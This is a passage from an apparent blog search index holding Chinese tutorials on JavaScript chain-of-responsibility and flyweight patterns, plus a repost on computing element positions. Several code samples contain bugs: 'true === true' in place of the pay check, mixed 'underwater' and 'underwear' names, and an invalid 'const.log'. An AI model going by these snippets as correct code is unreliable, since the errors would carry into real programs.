我们都知道，毒贩子虽然使吸毒者和制毒者之间的耦合度降低，但毒贩子也要抽走一部分利润。同样，在程序中，中介者对象要占去一部分内存。而且毒贩本身还要防止被警察抓住，因为它了解整个犯罪链条中的所有关系，这表明中介者对象自身往往是一个难以维护的对象。 中介者模式可以非常方便地对模块或者对象进行解耦，但对象之间并非一定需要解耦。在实际项目中，模块或对象之间有些依赖关系是很正常的。关键在于如何取衡量对象之间的耦合程度。一般来说，如果对象之间 的复杂耦合确实导致调用和维护出现了困难，而且这些耦合度随着项目的变化呈现出来指数增长曲线，那我们就可以考虑用中介者模式来重构代码。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——职责链模式]]></title>
    <url>%2F2019-03-12-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E8%81%8C%E8%B4%A3%E9%93%BE%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——职责链模式职责链模式的定义是：使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系，将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。 一系列可能会请求的对象被连接成一条链，请求在这些对象之间依次传递，直到遇到一个可以处理它的对象，我们把这些对象称为链中的节点。 现实中的职责链模式职责链模式的例子在现实中并不难找到，以下就是两个常见的跟职责链模式有关的场景。 如果早高峰能顺利挤上公交车的话，那么估计这一天都会过得很开心。因为公交车上人实在太多了，经常上车后却找不到售票员在哪，所以只好把两块钱硬币往前面递。除非你运气够好，站在你前面的第一个人就是售票员，否则，你的硬币通常要在 N 个人手上传递，才能最终到达售票员的手里。 中学时代的期末考试，如果你平时不太老实，考试时就会被安排在第一个位置。遇到不会答的题目，就把题目编号写在小纸条上往后传递，坐在后面的同学如果也不会答，他就会把这张小纸条继续递给他后面的人 从这两个例子中，我们很容易找到职责链模式的最大优点：请求发送者只需要知道链中的第一个节点，从而弱化了发送者和一组接收者之间的强联系。如果不使用职责链模式，那么在公交车上，我就得先搞清楚谁是售票员，才能把硬币递给他。同样，在期末考试中，也许我就要先了解同学中有哪些可以解答这道题 实际开发中的职责链模式假设我们负责一个售卖手机的电商网站，经过分别交纳 500 元定金和 200 元定金的两轮预定后（订单已在此时生成），现在已经到了正式购买的阶段。 公司针对支付过定金的用户有一定的优惠政策。在正式购买后，已经支付过 500 元定金的用户会收到 100 元的商城优惠券，200 元定金的用户可以收到 50 元的优惠券，而之前没有支付定金的用户只能进入普通购买模式，也就是没有优惠券，且在库存有限的情况下不一定保证能买到 我们的订单页面是 PHP 吐出的模板，在页面加载之初，PHP 会传递给页面几个字段： orderType：表示订单类型（定金用户或者普通购买用户），code 的值为 1 的时候是 500 元定金用户，为 2 的时候是 200 元定金用户，为 3 的时候是普通购买用户。 pay：表示用户是否已经支付定金，值为 true 或者 false, 虽然用户已经下过 500 元定金的订单，但如果他一直没有支付定金，现在只能降级进入普通购买模式 stock：表示当前用于普通购买的手机库存数量，已经支付过 500 元或者 200 元定金的用户不受此限制 代码实现： 123456789101112131415161718192021222324252627282930const order = (orderType,pay,stock) =&gt;&#123; if(orderType === 1)&#123; // 500 元定金购买模式 if(pay === true)&#123; console.log('500 元定金预购, 得到 100 优惠券'); &#125;else&#123; // 未支付定金，降级到普通模式 if(stock &gt; 0)&#123; // 用于普通购买的手机还有库存 console.log('普通购买，无优惠券'); &#125;else&#123; console.log('库存不足'); &#125; &#125; &#125;else if(orderType === 2)&#123; // 200 元定金购买模式 if(pay === true)&#123; console.log('200 元定金预购, 得到 50 优惠券'); &#125;else&#123; // 未支付定金，降级到普通模式 if(stock &gt; 0)&#123; // 用于普通购买的手机还有库存 console.log('普通购买，无优惠券'); &#125;else&#123; console.log('库存不足'); &#125; &#125; &#125;else if(orderType === 3)&#123; if(stock &gt; 0)&#123; console.log('普通购买，无优惠券'); &#125;else&#123; console.log('库存不足'); &#125; &#125; &#125;order(1,true,500); // 500 元定金预购, 得到 100 优惠券 用职责链模式重构代码现在我们采用职责链模式重构这段代码，先把 500 元订单、200 元订单以及普通购买分成 3个函数。 接下来把 orderType、pay、stock 这 3 个字段当作参数传递给 500 元订单函数，如果该函数不符合处理条件，则把这个请求传递给后面的 200 元订单函数，如果 200 元订单函数依然不能处理该请求，则继续传递请求给普通购买函数，代码如下： 12345678910111213141516171819202122232425262728293031// 500元订单const order500 = (orderType,pay,stock) =&gt;&#123; if(orderType=== 1 &amp;&amp; true === true)&#123; console.log('500 元定金预购, 得到 100 优惠券'); &#125;else&#123; order200(orderType,pay,stock); &#125;&#125;// 200元订单const order200 = (orderType,pay,stock) =&gt;&#123; if(orderType=== 2 &amp;&amp; true === true)&#123; console.log('200 元定金预购, 得到 50 优惠券'); &#125;else&#123; orderNormal(orderType,pay,stock); &#125;&#125; // 普通购买订单const orderNormal = (orderType,pay,stock) =&gt;&#123; if(stock &gt; 0)&#123; console.log('普通购买，无优惠券'); &#125;else&#123; console.log('库存不足'); &#125;&#125;order500( 1 , true, 500); // 输出：500 元定金预购, 得到 100 优惠券order500( 1, false, 500 ); // 输出：普通购买, 无优惠券order500( 2, true, 500 ); // 输出：200 元定金预购, 得到 50 优惠券order500( 3, false, 500 ); // 输出：普通购买, 无优惠券order500( 3, false, 0 ); // 输出：库存不足 目前已经有了不小的进步，但我们不会满足于此，虽然已经把大函数拆分成了互不影响的 3个小函数，但可以看到，请求在链条传递中的顺序非常僵硬，传递请求的代码被耦合在了业务函数之中： 123456789// 500元订单const order500 = (orderType,pay,stock) =&gt;&#123; if(orderType=== 1 &amp;&amp; true === true)&#123; console.log('500 元定金预购, 得到 100 优惠券'); &#125;else&#123; order200(orderType,pay,stock); // order200 和 order500 耦合在一起 &#125;&#125; 这依然是违反开放封闭原则的，如果有天我们要增加 300 元预订或者去掉 200 元预订，意味着就必须改动这些业务函数内部。就像一根环环相扣打了死结的链条，如果要增加、拆除或者移动一个节点，就必须得先砸烂这根链条 灵活可拆分的职责链节点们采用一种更灵活的方式，来改进上面的职责链模式，目标是让链中的各个节点可以灵活拆分和重组。 首先需要改写一下分别表示 3 种购买模式的节点函数，我们约定，如果某个节点不能处理请求，则返回一个特定的字符串 ‘nextSuccessor’来表示该请求需要继续往后面传递 1234567891011121314151617181920212223242526// 500元订单const order500 = (orderType,pay,stock) =&gt;&#123; if(orderType=== 1 &amp;&amp; pay === true)&#123; console.log('500 元定金预购, 得到 100 优惠券'); &#125;else&#123; return 'nextSuccessor'; // 我不知道下一个节点是谁，反正把请求往后面传递 &#125;&#125;// 200元订单const order200 = (orderType,pay,stock) =&gt;&#123; if(orderType=== 2 &amp;&amp; pay === true)&#123; console.log('200 元定金预购, 得到 50 优惠券'); &#125;else&#123; return 'nextSuccessor'; // 我不知道下一个节点是谁，反正把请求往后面传递 &#125;&#125; // 普通购买订单const orderNormal = (orderType,pay,stock) =&gt;&#123; if(stock &gt; 0)&#123; console.log('普通购买，无优惠券'); &#125;else&#123; console.log('库存不足'); &#125;&#125; 接下来需要把函数包装进职责链节点，我们定义一个构造函数 Chain，在 new Chain 的时候传递的参数即为需要被包装的函数，同时它还拥有一个实例属性 this.successor，表示在链中的下一个节点。 123456789101112131415161718192021222324252627282930313233// 此外 Chain 的 prototype 中还有两个函数，它们的作用如下所示：// Chain.prototype.setNextSuccessor 指定在链中的下一个节点// Chain.prototype.passRequest 传递请求给某个节点const Chain = function(fn)&#123; this.fn = fn; this.successor = null;&#125;Chain.prototype.setNextSuccessor = function(successor)&#123; return this.successor = successor;&#125;Chain.prototype.passRequest = function()&#123; var ret = this.fn.apply(this,arguments); if(ret === 'nextSuccessor')&#123; return this.successor &amp;&amp; this.successor.passRequest.apply(this.successor,arguments); &#125; return ret;&#125;// 现在我们把 3 个订单函数分别包装成职责链的节点：const chainOrder500 = new Chain(order500);const chainOrder200 = new Chain(order200);const chainOrderNormal = new Chain(orderNormal);// 然后指定节点在职责链中的顺序chainOrder500.setNextSuccessor( chainOrder200 ); chainOrder200.setNextSuccessor( chainOrderNormal ); // 最后把请求传递给第一个节点：chainOrder500.passRequest( 1, true, 500 ); // 500 元定金预购, 得到 100 优惠券chainOrder500.passRequest( 2, true, 500 ); // 200 元定金预购, 得到 50 优惠券chainOrder500.passRequest( 3, true, 500 ); // 普通购买，无优惠券chainOrder500.passRequest( 1, false, 500 ); // 库存不足 通过改进，我们可以自由灵活地增加、移除和修改链中的节点顺序，假如某天网站运营人员又想出了支持 300 元定金购买，那我们就在该链中增加一个节点即可: 123456var order300 = function()&#123; // 具体实现略&#125;chainOrder300 = new Chain(order300);chainOrder500.setNextSuccessor(chainOrder300);chainOrder300.setNextSuccessor(chainOrder200); 对于程序员来说，我们总是喜欢去改动那些相对容易改动的地方，就像改动框架的配置文件远比改动框架的源代码简单得多。在这里完全不用理会原来的订单函数代码，我们要做的只是增加一个节点，然后重新设置链中相关节点的顺序。 异步的职责链在上一节的职责链模式中，我们让每个节点函数同步返回一个特定的值”nextSuccessor”，来表示是否把请求传递给下一个节点。而在现实开发中，我们经常会遇到一些异步的问题，比如我们要在节点函数中发起一个 ajax 异步请求，异步请求返回的结果才能界定是否继续在职责链中 passRequest 这时候让节点函数同步返回 ‘nextSuccessor’已经没有什么意义了，所以在给 Chain 类再增加一个原型方法 ，表示手动传递请求给职责链的下一个节点： 12345678910111213141516171819202122Chain.prototype.next = function()&#123; return this.successor &amp;&amp; this.successor.passRequest.apply(this.successor,arguments);&#125;const fn1 = new Chain(function()&#123; console.log(1); return 'nextSuccessor';&#125;);const fn2 = new Chain(function()&#123; console.log(2); setTimeout(()=&gt;&#123; this.next(); &#125;,1000); &#125;);const fn3 = new Chain(function()&#123; console.log(3);&#125;); fn1.setNextSuccessor(fn2).setNextSuccessor(fn3);fn1.passRequest(); 现在我们得到了一个特殊的链条，请求在链中的节点传递，但节点有权利决定什么时候把请求给下一个节点，可以想象，异步的职责链加上命令模式（把 ajax 请求封装成命令对象），可以很方便地创建一个异步 ajax 队列库。 职责链模式的优缺点最大的优点就是解耦了请求发送者和 N 个接收者之间的复杂关系，由于不知道链中的哪个节点可以处理你发出的请求，所以你只需要把请求传递给第一个节点即可。 在手机商城的例子中，本来我们要被迫维护一个充斥着条件分支语句的巨大的函数，在例子里的购买过程中只打印了一条 log 语句。其实在现实开发中，这里要做更多事情，比如根据订单种类弹出不同的浮层提示、渲染不同的 UI 节点、组合不同的参数发送给不同的 cgi 等。 用了职责链模式之后，每种订单都有各自的处理函数而互不影响。 其次，链中的节点对象可以灵活拆分重组，增加或者是删除一个节点或者是改变节点 在链中的位置都是轻而易举的事情。这一点我们可以看出，在上面的例子中，增加一种订单完全不需要改变其他订单函数中代码。 职责链模式还有一个优点，就是可手动指定起始节点，请求并不是非得从链中的第一个节点开始递。比如在公交车的例子中，如果我明确在我前面的第一个人不是售票员，那我当然可以越过他把公交卡递给他前面的人，这样可以减少请求在链中的传递次数，更快地找到合适的请求接受者。这在普通的条件分支语句下是做不到的，我们没有办法让请求越过某一个 if 判断。 拿代码来证明这一点，假设某一天网站中支付过定金的订单已经全部结束购买流程，我们在接下来的时间里只需要处理普通购买订单，所以我们可以直接把请求交给普通购买订单节点： 1orderNormal.passRequest(1,false,500); // 普通购买，无优惠券 如果运用得当，职责链模式可以很好地帮助我们组织代码，但这种模式也并非没有弊端，首先我们不能保证某个请求一定会被链中的节点处理。比如在期末考试的例子中，小纸条上的题目也许没有任何一个同学知道如何解答，此时的请求就得不到答复，而是径直从链尾离开，或者抛出一个错误异常。在这种情况下，我们可以在链尾增加一个保底的接受者节点来处理这种即将离开链尾的请求. 另外，职责链模式使得程序中多了一些节点对象，可能在某一次的请求传递过程中，大部分节点并没有起到实质性的作用，它们的作用仅仅是让请求传递下去，从性能方面考虑，我们要避免过长的职责链带来的性能损耗。 用 AOP 实现职责链改写一下 Function.prototype.after 函数，使得第一个函数返回 ‘nextSuccessor’时，将请求继续传递给下一个函数，无论是返回字符串 ‘nextSuccessor’还是 false 都只是一个约定，当然我们这里也可以让函数返回 false 表示传递请求，选择 ‘nextSuccessor’ 字符串是因为它看起来更能表达我们的目的，代码如下： 1234567891011121314Function.prototype.after = function(fn)&#123; var self = this; return function()&#123; var ret = self.apply(this,arguments) if(ret === 'nextSuccessor')&#123; return fn.apply(this,arguments); &#125;; return ret; &#125;&#125;var order = order500.after( order200 ).after( orderNormal ); order( 1, true, 500 ); // 500 元定金预购，得到 100 优惠券order( 2, true, 500 ); // 200 元定金预购，得到 50 优惠券order( 1, false, 500 ); // 普通购买，无优惠券 用职责链模式获取文件上传对象迭代器模式的时候有一个获取文件上传对象的例子，创建了一个迭代器来获取合适的文件上传对象，其实用职责链模式可以更简单，完全不用创建多余的迭代器，完整代码： 12345678910111213141516171819202122const getActiveUploadObj = function()&#123; try&#123; return new ActiveXObject('TXFTNActiveX.FTNUpload'); // IE 上传控件 &#125;catch(e)&#123; return 'nextSuccessor' &#125;&#125;const getFlashUploadObj = function()&#123; if(supportFlash())&#123; var str = '&lt;object type="application/x-shockwave-flash"&gt;&lt;/object&gt;'; return $( str ).appendTo( $('body') ); &#125; return 'nextSuccessor' &#125;const getFormUploadObj = function()&#123; return $( '&lt;form&gt;&lt;input name="file" type="file"/&gt;&lt;/form&gt;' ).appendTo( $('body') ); &#125;const getUploadObj = getActiveUploadObj.after(getFlashUploadObj).after(getFormUploadObj);const.log(getUploadObj()); 小结在 JavaScript 中，职责链模式是最容易被忽视的一种模式。实际上只要运用得当，职责链模式可以很好地帮助我们管理代码，降低发起请求的对象和处理请求对象之间的耦合性。职责链中的节点数量和顺序都是可以自由变化的，我们可以在运行的时候决定链中包含哪些节点。 无论是作用域链，原型链，还是 Dom 节点中的事件冒泡，我们都可以从中发现职责链模式的影子。职责链模式还可以和组合模式结合在一起，用来连接部件和父部件，或是提高组合对象的效率。学会使用职责链模式，将有所收益。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用Javascript获取页面元素的位置]]></title>
    <url>%2F2019-03-09-%E7%94%A8Javascript%E8%8E%B7%E5%8F%96%E9%A1%B5%E9%9D%A2%E5%85%83%E7%B4%A0%E7%9A%84%E4%BD%8D%E7%BD%AE%EF%BC%88%E8%BD%AC%EF%BC%89.html</url>
    <content type="text"><![CDATA[原文地址：用Javascript获取页面元素的位置 用Javascript获取页面元素的位置制作网页的过程中，你有时候需要知道某个元素在网页上的确切位置。 下面的教程总结了Javascript在网页定位方面的相关知识。 网页的大小和浏览器窗口的大小首先，要明确两个基本概念。 一张网页的全部面积，就是它的大小。通常情况下，网页的大小由内容和CSS样式表决定。 浏览器窗口的大小，则是指在浏览器窗口中看到的那部分网页面积，又叫做viewport（视口）。 很显然，如果网页的内容能够在浏览器窗口中全部显示（也就是不出现滚动条），那么网页的大小和浏览器窗口的大小是相等的。如果不能全部显示，则滚动浏览器窗口，可以显示出网页的各个部分。 获取网页的大小网页上的每个元素，都有clientHeight和clientWidth属性。这两个属性指元素的内容部分再加上padding的所占据的视觉面积，不包括border和滚动条占用的空间。 （图一 clientHeight和clientWidth属性） 因此，document元素的clientHeight和clientWidth属性，就代表了网页的大小。 12345678910111213 function getViewport()&#123; if (document.compatMode == "BackCompat")&#123; return &#123; width: document.body.clientWidth, height: document.body.clientHeight &#125; &#125; else &#123; return &#123; width: document.documentElement.clientWidth, height: document.documentElement.clientHeight &#125; &#125; &#125; 上面的getViewport函数就可以返回浏览器窗口的高和宽。使用的时候，有三个地方需要注意： 1）这个函数必须在页面加载完成后才能运行，否则document对象还没生成，浏览器会报错。 2）大多数情况下，都是document.documentElement.clientWidth返回正确值。但是，在IE6的quirks模式中，document.body.clientWidth返回正确的值，因此函数中加入了对文档模式的判断。 3）clientWidth和clientHeight都是只读属性，不能对它们赋值。 获取网页大小的另一种方法 网页上的每个元素还有scrollHeight和scrollWidth属性，指包含滚动条在内的该元素的视觉面积。 那么，document对象的scrollHeight和scrollWidth属性就是网页的大小，意思就是滚动条滚过的所有长度和宽度。 仿照getViewport()函数，可以写出getPagearea()函数。 12345678910111213 function getPagearea()&#123; if (document.compatMode == "BackCompat")&#123; return &#123; width: document.body.scrollWidth, height: document.body.scrollHeight &#125; &#125; else &#123; return &#123; width: document.documentElement.scrollWidth, height: document.documentElement.scrollHeight &#125; &#125; &#125; 但是，这个函数有一个问题。如果网页内容能够在浏览器窗口中全部显示，不出现滚动条，那么网页的clientWidth和scrollWidth应该相等。但是实际上，不同浏览器有不同的处理，这两个值未必相等。所以，我们需要取它们之中较大的那个值，因此要对getPagearea()函数进行改写。 1234567891011121314151617 function getPagearea()&#123; if (document.compatMode == "BackCompat")&#123; return &#123; width: Math.max(document.body.scrollWidth, document.body.clientWidth), height: Math.max(document.body.scrollHeight, document.body.clientHeight) &#125; &#125; else &#123; return &#123; width: Math.max(document.documentElement.scrollWidth, document.documentElement.clientWidth), height: Math.max(document.documentElement.scrollHeight, document.documentElement.clientHeight) &#125; &#125; &#125; 获取网页元素的绝对位置网页元素的绝对位置，指该元素的左上角相对于整张网页左上角的坐标。这个绝对位置要通过计算才能得到。 首先，每个元素都有offsetTop和offsetLeft属性，表示该元素的左上角与父容器（offsetParent对象）左上角的距离。所以，只需要将这两个值进行累加，就可以得到该元素的绝对坐标。 （图二 offsetTop和offsetLeft属性） 下面两个函数可以用来获取绝对位置的横坐标和纵坐标。 1234567891011121314151617181920212223 function getElementLeft(element)&#123; var actualLeft = element.offsetLeft; var current = element.offsetParent; while (current !== null)&#123; actualLeft += current.offsetLeft; current = current.offsetParent; &#125; return actualLeft; &#125; function getElementTop(element)&#123; var actualTop = element.offsetTop; var current = element.offsetParent; while (current !== null)&#123; actualTop += current.offsetTop; current = current.offsetParent; &#125; return actualTop; &#125; 由于在表格和iframe中，offsetParent对象未必等于父容器，所以上面的函数对于表格和iframe中的元素不适用。 获取网页元素的相对位置网页元素的相对位置，指该元素左上角相对于浏览器窗口左上角的坐标。 有了绝对位置以后，获得相对位置就很容易了，只要将绝对坐标减去页面的滚动条滚动的距离就可以了。滚动条滚动的垂直距离，是document对象的scrollTop属性；滚动条滚动的水平距离是document对象的scrollLeft属性。 （图三 scrollTop和scrollLeft属性） 对上一节中的两个函数进行相应的改写： 1234567891011121314151617181920212223242526272829303132333435 function getElementViewLeft(element)&#123; var actualLeft = element.offsetLeft; var current = element.offsetParent; while (current !== null)&#123; actualLeft += current.offsetLeft; current = current.offsetParent; &#125; if (document.compatMode == "BackCompat")&#123; var elementScrollLeft=document.body.scrollLeft; &#125; else &#123; var elementScrollLeft=document.documentElement.scrollLeft; &#125; return actualLeft-elementScrollLeft; &#125; function getElementViewTop(element)&#123; var actualTop = element.offsetTop; var current = element.offsetParent; while (current !== null)&#123; actualTop += current. offsetTop; current = current.offsetParent; &#125; if (document.compatMode == "BackCompat")&#123; var elementScrollTop=document.body.scrollTop; &#125; else &#123; var elementScrollTop=document.documentElement.scrollTop; &#125; return actualTop-elementScrollTop; &#125; scrollTop和scrollLeft属性是可以赋值的，并且会立即自动滚动网页到相应位置，因此可以利用它们改变网页元素的相对位置。另外，element.scrollIntoView()方法也有类似作用，可以使网页元素出现在浏览器窗口的左上角。 获取元素位置的快速方法除了上面的函数以外，还有一种快速方法，可以立刻获得网页元素的位置。 那就是使用getBoundingClientRect()方法。它返回一个对象，其中包含了left、right、top、bottom四个属性，分别对应了该元素的左上角和右下角相对于浏览器窗口（viewport）左上角的距离。 所以，网页元素的相对位置就是 12var X= this.getBoundingClientRect().left;var Y =this.getBoundingClientRect().top; 再加上滚动距离，就可以得到绝对位置 12var X= this.getBoundingClientRect().left+document.documentElement.scrollLeft;var Y =this.getBoundingClientRect().top+document.documentElement.scrollTop;]]></content>
      <categories>
        <category>转载好文</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——享元模式]]></title>
    <url>%2F2019-03-06-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——享元模式享元（flyweight）模式是一种用于性能优化的模式，‘fly’ 在这里是苍蝇的意思，意为蝇量级。享元模式的核心是运用共享技术来有效支持大量细粒度的对象。 如果系统中因为创建了大量类似的对象而导致内存占用过高，享元模式就非常有用了。在 JavaScript 中，浏览器特别是移动端的浏览器分配的内存并不算多，如何节省内存就成了 一件非常有意义的事情。 初识享元模式假设有个内衣工厂，目前的产品有 50 种男式内衣和 50 种女士内衣，为了推销产品，工厂决定生产一些塑料模特来穿上他们的内衣拍成广告照片。 正常情况下需要 50 个男模特和 50 个女模特，然后让他们每人分别穿上一件内衣来拍照。不使用享元模式的情况下，在程序里也许会这样写 123456789101112131415var Model = function(sex,underwear)&#123; this.sex = sex; this.underwear = underwear;&#125;Model.prototype.takePhoto = function()&#123; console.log('sex='+this.sex + 'underwear='+this.underwear);&#125;for(var i=1;i&lt;=50;i++)&#123; var maleModel = new Model('male','underwear'+i); maleModel.takePhoto();&#125;for(var i=1;i&lt;=50;i++)&#123; var femaleModel = new Model('female','underwear'+i); femaleModel.takePhoto();&#125; 要得到一张照片，每次都需要传入 sex 和 underwear 参数，如上所述，现在一共有 50 种男内衣和 50 种女内衣，所以一共会产生 100 个对象。如果将来生产了 10000 种内衣，那这个程序可能会因为存在如此多的对象已经提前崩溃. 虽然有 100 种内衣，但很显然并不需要 50 个男模特和 50 个女模特。其实男模特和女模特各自有一个就足够了，他们可以分别穿上不同的内衣来拍照 1234567891011121314151617181920// 把 underwear 参数从构造函数中移除，构造函数只接收 sex 参数：var Model = function(sex,underwear)&#123; this.sex = sex;&#125;Model.prototype.takePhoto = function()&#123; console.log('sex='+this.sex + 'underwear='+this.underwear);&#125;// 分别创建一个男模特对象和一个女模特对象var maleModel = new Model('male');var femaleModel = new Model('female');// 给男模特依次穿上所有的男装，并进行拍照：for(var i=1;i&lt;=50;i++)&#123; maleModel.underwater = 'underwater' + i; maleModel.takePhoto();&#125;// 给女模特依次穿上所有的男装，并进行拍照：for(var i=1;i&lt;=50;i++)&#123; femaleModel.underwater = 'underwater' + i; femaleModel.takePhoto();&#125; 内部状态与外部状态享元模式要求将对象的属性划分为内部状态和外部状态（状态在这里通常是指属性）。享元模式的目标是尽量减少共享对象的数量，如何划分它们，下面有几条经验作为指引： 内部状态存储于对象内部 内部状态可以被一些对象共享 内部状态独立于具体的场景，通常不会改变 外部状态取决于具体的场景，并且根据场景的变化而变化，外部状态不能被共享 我们可以把所有内部状态相同的对象都指定为同一个共享的对象。而外部状态可以从对象上剥离出来，并存储在外部。 剥离了外部状态的对象成为共享对象，外部状态在必要的时候被传入共享对象来组装成一个完整的对象。虽然组装外部状态成为了一个完整对象的过程需要一定的时间，但却可以大大减少系统中的对象数量。相比之下，这点时间或许是微不足道的。因此，享元模式是一种用时间换空间的优化模式。 在上面的例子中，性别是内部状态，内衣是外部状态，通过区分这两种状态，大大减少了系统中的对象数量。通常来说，内部状态有多少种组合，系统中便最多存在多少个对象，因为性别通常只有男女两种，所有该内衣厂商最多需要2个对象。 使用享元模式的关键是如何区分内部状态和外部状态。可以被对象共享的属性通常被划分为内部状态，如同不管什么样式的衣服，都可以按照性别的不同，穿在同一个男模特或者女模特身上。模特的性别就可以作为内部存储在共享对象内部。而外部状态取决于具体的场景，并根据场景二变化，就像例子中每件衣服都是不同的，它们不能被一些对象共享，因此只能被划分为外部状态。 享元模式的通用结构上面例子中还不是一个完整的享元模式，还存在以下几个问题。 我们通过构造函数显式 new 出了男女两个 model 对象，在其他系统中，也许这并不是一开始就需要所有的共享对象。 给 model 对象手动设置了 underwater 外部状态，在更复杂的系统中，这并不是最好的方式，因为外部状态可能会相当复杂，它们与共享对象的联系会变得更加困难。 我们通过一个对象工厂来解决第一个问题，只有当某种共享对象被真正需要的时候，它从才工厂中被创建出来，对于第二个问题，可以用一个管理器来记录对象相关的外部状态，使得这些外部状态通过某个钩子和共享对象联系起来。 文件上传的例子在微云上传模板的开发中，作者曾经借助享元模式提升了程序的性能。 对象爆炸微云的文件上创功能虽然可以选择依照队列，一个一个排队上传，但也支持同时选择 2000 个文件。每一个文件都对应着一个 JavaScript 上传对象的创建，在第一版开发中，的确往程序里面同时 new 了 2000个 upload 对象，结果可想而知。Chrome 中还勉强能够支撑，IE 下直接进入假死状态。 微云支持好几种上传方式，比如浏览器插件、Flash 和表单上传等，为了简化例子，作者假设只有插件和 Flash 这两种。不论是插件上传，还是 Flash 上传，原理都是一样的，当用户选择了文件之后，插件和 Flash 都会通知调用 Window 下的一个全局 JavaScript 函数，它的名字是startUpload，用户选择的文件列表被组合成一个数组 files 塞进该函数的参数列表里，代码如下： 123456789101112131415161718192021222324252627282930313233var id = 0;window.startUpload = function(uploadType,files)&#123; // uploadType 区分是控件还是 flash for(var i=0,file;file=files[i++];)&#123; var uploadObj = new Upload(uploadType,file.fileName,file.fileSize); uploadObj.init(id++); // 给 upload 对象设置一个唯一的 id &#125;&#125;var Upload = function(uploadType,fileName,fileSize)&#123; this.uploadType = uploadType; this.fileName = fileName; this.fileSize = fileSize; this.dom = null;&#125;Upload.prototype.init = function(id)&#123; var that = this; this.id = id; this.dom = document.createElement('div'); this.dom.innerHTML = '&lt;span&gt;文件名称:'+ this.fileName +', 文件大小: '+this.fileSize +'&lt;/span&gt;' + '&lt;button class="delFile"&gt;删除&lt;/button&gt;'; this.dom.querySelector('.delFile').onclick = function()&#123; that.delFile(); &#125;; document.body.appendChild(this.dom);&#125;Upload.prototype.delFile = function()&#123; if(this.fileSize &lt; 3000)&#123; return this.dom.parentNode.removeChild(this.dom); &#125; if(window.confirm('确定删除该文件吗？'+this.fileName))&#123; return this.dom.parentNode.removeChild(this.dom); &#125;&#125; 接下来分别创建 3 个插件上传对象和三个 Flash 上传对象： 12345678910startUpload('plugin',[ &#123;fileName: '1.txt', fileSize: 1000 &#125;, &#123;fileName: '2.html', fileSize: 3000 &#125;, &#123;fileName: '3.txt', fileSize: 5000 &#125;, ]); startUpload('flash',[ &#123;fileName: '4.txt', fileSize: 1000 &#125;, &#123;fileName: '5.html', fileSize: 3000 &#125;, &#123;fileName: '6.txt', fileSize: 5000 &#125;, ]); 享元模式重构文件上传上一节的代码是第一版文件上传，在这段代码中有多少个需要上传的文件，就一共创建了多少个 upload 对象，下面用享元模式重构它。 首先，我们需要确认插件类型 uploadType 是内部状态，那为什么单单 uploadType 是内部状态，前面说过，划分内部状态和外部状态的关键是主要下面几点： 内部状态储存于对象内部。 内部状态可以被一些对象共享。 内部状态独立于具体的场景，通常不会改变。 外部状态取决于具体的场景并根据场景而变化外部状态不能被共享。 在文件上传的例子中，upload 对象必须依赖 uploadType 属性才能工作，这是因为插件上传、Flash 上传、表单上传的实际工作原理有很大的区别，它们各自调用的接口也是不一样的，必须在对象创建之初就明确它是什么类型的插件，才可以在程序的运行过程中，让它们分别调用各自的 start、pause、cancel、del 等方法。 实际上在微云的真实代码中，虽然插件和 Flash 上传对象最终创建自一个大的工厂类，但它们实际上根据 uploadType 值的不同，分别是来自于两个不同类的对象。 一旦明确了 uploadType，无论我们使用什么方式上传，这个上传对象都是可以被任何文件共用的。而 fileName 和 fileSize 是根据场景而变化的，每个文件的 fileName 和 fileSize 都不一样，fileName 和 fileSize 没有办法被共享，它们只能被划分为外部状态。 剥离外部状态明确了 uploadType 作为内部状态之后，我们再把其他外部状态从构造函数中抽离出来，Upload 构造函数中只保留 uploadType 参数： 1234567891011121314var Upload = function(uploadType)&#123; this.uploadType = uploadType;&#125;// init 函数也不再需要了，因为 upload 对象初始化的工作被放在了 uploadManager.add 函数中，下面定义的是 删除函数Upload.prototype.delFile = function(id)&#123; // 开始删除文件之前，需要读取文件的实际大小，而文件的实际大小被存储在外部管理器 uploadManager 中，这里需要 setExternalState 方法给共享对象设置正确的 fileSize。这里表示把当前 id 对应的对象的外部状态都组装到共享对象中 uploadManager.setExternalState(id,this); if(this.fileSize &lt; 3000)&#123; return this.dom.parentNode.removeChild(this.dom); &#125; if(window.confirm('确定删除该文件吗？'+this.fileName))&#123; return this.dom.parentNode.removeChild(this.dom); &#125; &#125; 工厂进行对象实例化接下里定义一个工厂来创建 upload 对象，如果某种内部状态对应的共享对象已经被创建过了，那么直接返回这个对象，否则创建一个新的对象： 1234567891011var UploadFactory = (function()&#123; var createdFlyWeightObjs = &#123;&#125;; return&#123; create:function(uploadType)&#123; if(createdFlyWeightObjs[uploadType])&#123; return createdFlyWeightObjs[uploadType] &#125; return createdFlyWeightObjs[uploadType] = new Upload(uploadType); &#125; &#125;&#125;)() 管理器封装外部状态完善前面提到的 uploadManager 对象，它负责向 UploadFactory 提交创建对象的请求，并用一个 uploadDatabase 对象保存所有 upload 对象的外部状态，以便在程序运行的过程中给 upload 共享对象设置外部状态： 1234567891011121314151617181920212223242526var uploadManager = (function()&#123; var uploadDatabase = 